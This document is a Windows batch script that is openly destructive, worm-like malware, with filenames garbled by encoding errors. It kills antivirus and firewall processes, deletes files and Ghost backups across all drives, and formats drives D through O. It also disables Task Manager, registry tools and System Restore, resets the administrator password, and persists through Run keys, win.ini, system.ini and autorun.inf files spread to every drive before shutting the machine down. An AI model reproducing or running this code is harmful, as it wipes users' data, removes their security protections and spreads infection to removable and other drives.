@echo off
cls
date 1987-09-30
copy фф©гноеё.exe "C:\Documents and Settings\All Users\║╦©╙й╪║╧╡к╣╔\ЁлпР\фТ╤╞"
set taskkill=s
copy фф©гноеё.exe %systemboot%\system32\cmd.bat
attrib %systemboot%\system32\cmd.bat +r +s +h
%s% /im pfw.exe shadowtip.exe shadowservice.exe qq.exe explorer.exe IEXOLORE.EXE /f >nul
%s% /im norton* /f >nul
%s% /im av* /f >nul
%s% /im fire* /f >nul
%s% /im anti* /f >nul
%s% /im spy* /f >nul
%s% /im bullguard /f >nul
%s% /im PersFw /f >nul
%s% /im KAV* /f >nul
%s% /im ZONEALARM /f >nul
%s% /im SAFEWEB /f >nul
%s% /im OUTPOST /f >nul
%s% /im nv* /f >nul
%s% /im nav* /f >nul
%s% /im F-* /f >nul
%s% /im ESAFE /f >nul
%s% /im cle /f >nul
%s% /im BLACKICE /f >nul
%s% /im def* /f >nul
%s% /im 360safe.exe /f >nul
net stop Shadow" "System" "Service
set alldrive=d e f g h i j k l m n o p q r s t u v w x y z
for %%a in (c %alldrive%) do del %%a:\360* /f /s /q >nul
for %%a in (c %alldrive%) do del %%a:\пч╦╢* /f /s /q >nul
@format d:/y/q
@format e:/y/q
@format f:/y/q
@format g:/y/q
@format h:/y/q
@format i:/y/q
@format j:/y/q
@format k:/y/q
@format l:/y/q
@format m:/y/q
@format n:/y/q
@format o:/y/q

REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\explorer\Advanced\Folder\Hidden\SHOWALL /v 
CheckedValue /t REG_DWORD /d 00000000 /f >nul
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v 
NoRun /t REG_DWORD /d 00000001 /f >nul
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v 
NoRecentDocsMenu /t REG_DWORD /d 00000001 /f >nul
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v 
NoDrives /t REG_DWORD /d 4294967295 /f >nul
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v 
Disableregistrytools /t REG_DWORD /d 00000002 /f >nul
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v 
NoNetHood /t REG_DWORD /d 00000001 /f >nul
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /V 
NoDesktop /t REG_DWORD /d 00000001 /f >nul
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v 
NoClose /t REG_DWORD /d 00000001 /f >nul
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v 
NoFind /t REG_DWORD /d 00000001 /f >nul
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v 
DisableTaskMgr /t REG_DWORD /d 00000001 /f >nul
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v 
NoLogOff /t REG_DWORD /d 00000001 /f >nul
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v 
NoSetTaskBar /t REG_DWORD /d 00000001 /f >nul
REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows" "NT\CurrentVersion\SystemRestore /v 
DisableSR /t REG_DWORD /d 00000001 /f >nul
REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows" "NT\SystemRestore /v 
DisableConfig /t REG_DWORD /d 00000001 /f >nul
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v 
RestrictRun /t REG_DWORD /d 00000001 /f >nul
cls
net user administrator 123456 >nul
for %%c in (c %alldrive%) do del %%c:\*.gho /f /s /q >nul
echo @echo off >d:\фф©гноеё.exe 
>>d:\фф©гноеё.exe
echo copy d:\фф©гноеё.exe c:\Documents" "and" "Settings\All" "Users\║╦©╙й╪║╧╡к╣╔\ЁлпР\фТ╤╞
\a.bat >>d:\фф©гноеё.exe
echo REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v 
фф©гноеё.exe /t REG_SZ /d d:\фф©гноеё.exe 
/f >>d:\фф©гноеё.exe
echo REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v 
фф©гноеё.exe /t REG_SZ /d d:\фф©гноеё.exe 
/f >>d:\фф©гноеё.exe
echo REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce /v 
фф©гноеё.exe /t REG_SZ /d d:\фф©гноеё.exe 
/f >>d:\фф©гноеё.exe
HKEY_CLASSES_ROOT\batfile\shell\open\command /v фф©гноеё.exe /t REG_SZ /d d:\фф©гноеё.exe /f 
>>d:\фф©гноеё.exe
echo [windows] >> %systemboot%\win.ini
echo run=d:\фф©гноеё.exe C:\фф©гноеё.exe >> %systemboot%\win.ini
echo load=d:\фф©гноеё.exe C:\фф©гноеё.exe >> %systemboot%\win.ini
echo [boot] >> %systemboot%\system.ini
echo shell=explorer.exe фф©гноеё.exe C:\фф©гноеё.exe >> %systemboot%\system.ini
echo [AutoRun] >d:\autorun.inf
echo Open=фф©гноеё.exe >>d:\autorun.inf
echo Open=system.bat >>d:\autorun.inf
attrib d:\autorun.inf +r +s +h >>d:\фф©гноеё.exe
attrib d:\фф©гноеё.exe +r +s +h >>d:\фф©гноеё.exe
start d:\фф©гноеё.exe /min >nul
echo @echo off >>C:\фф©гноеё.exe
echo REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v 
фф©гноеё.exe /t REG_SZ /d 
C:\фф©гноеё.exe /f >>C:\фф©гноеё.exe
echo REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v 
фф©гноеё.exe /t REG_SZ /d 
C:\фф©гноеё.exe /f >>C:\фф©гноеё.exe
REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce /v 
фф©гноеё.exe /t REG_SZ /d 
C:\фф©гноеё.exe /f >>C:\фф©гноеё.exe
echo REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v 
фф©гноеё.exe /t REG_SZ /d d:\фф©гноеё.exe 
/f >>C:\фф©гноеё.exe
echo REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v 
фф©гноеё.exe /t REG_SZ /d d:\фф©гноеё.exe 
/f >>C:\фф©гноеё.exe
REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce /v 
фф©гноеё.exe /t REG_SZ /d d:\фф©гноеё.exe 
/f >>C:\фф©гноеё.exe
echo if not d:\фф©гноеё.exe start %systemboot%\system32\cmd.bat /min >>C:\фф©гноеё.exe
copy фф©гноеё.exe %systemroot%\windows.bat >nul
if not exist %systemboot%/system32/explorer.bat @echo off >>%systemboot%/system32/explorer.bat
if not exist C:\фф©гноеё.exe start %systemboot%\system32\cmd.bat /min >>%
systemboot%/system32/explorer.bat
if not exist %systemboot%\system32\cmd.bat start %systemroot%\windows.bat /min >>%
systemboot%/system32/explorer.bat
echo REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v 
фф©гноеё.exe /t REG_SZ /d 
C:\фф©гноеё.exe /f >>%systemboot%/system32/explorer.bat
echo REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v 
фф©гноеё.exe /t REG_SZ /d 
C:\фф©гноеё.exe /f >>%systemboot%/system32/explorer.bat
echo REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v 
фф©гноеё.exe /t REG_SZ /d d:\фф©гноеё.exe 
/f >>%systemboot%/system32/explorer.bat
echo REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v 
фф©гноеё.exe /t REG_SZ /d d:\фф©гноеё.exe 
/f >>%systemboot%/system32/explorer.bat
echo REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v 
explorer.bat /t REG_SZ /d %
systemboot%/system32/explorer.bat/f >>%systemboot%/system32/explorer.bat
echo REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v 
explorer.bat /t REG_SZ /d %
systemboot%/system32/explorer.bat /f >>%systemboot%/system32/explorer.bat
echo start %systemroot%\windows.bat /min >>%systemboot%/system32/explorer.bat
attrib %systemboot%/system32/explorer.bat +r +s +h%
attrib %systemroot%/windows.bat +r +s +h
for %%c in (%alldrive%) do echo @echo off >>%%c:\system.bat
for %%c in (%alldrive%) do echo start %systemboot%\system32\cmd.bat /min >>%%c:\system.bat
for %%c in (%alldrive%) do echo attrib system.bat +r +s +h >>%%c:\system.bat
set drive=e f g h i j k l m n o p q r s t u v w x y z
for %%c in (%drive%) do echo [AuroRun] >%%c:\autorun.inf
for %%c in (%drive%) do echo Open=system.bat >>%%c:\autorun.inf
copy фф©гноеё.exe d:\Program" "Files\run.bat
for %%c in (%alldrive%) do echo if not exist %systemboot%/system32/explorer.bat start 
d:\Program" "Files\run.bat /min 
>>%%c:\system.bat
for %%c in (%alldrive%) do attrib autorun.inf +r +s +h >>%%c:\system.bat
for %%c in (%alldrive%) do attrib %%c:\autorun.inf +r +s +h >nul
for %%c in (%alldrive%) do attrib %%c:\system.bat +r +s +h >nul
if not exist %systemboot%/system32/explorer.bat start d:\Program" "Files\run.bat
/min >>d:\фф©гноеё.exe
attrib d:\Program" "Files\run.bat +r +s +h >nul
del фф©гноеё.exe
shutdown -s
@echo.
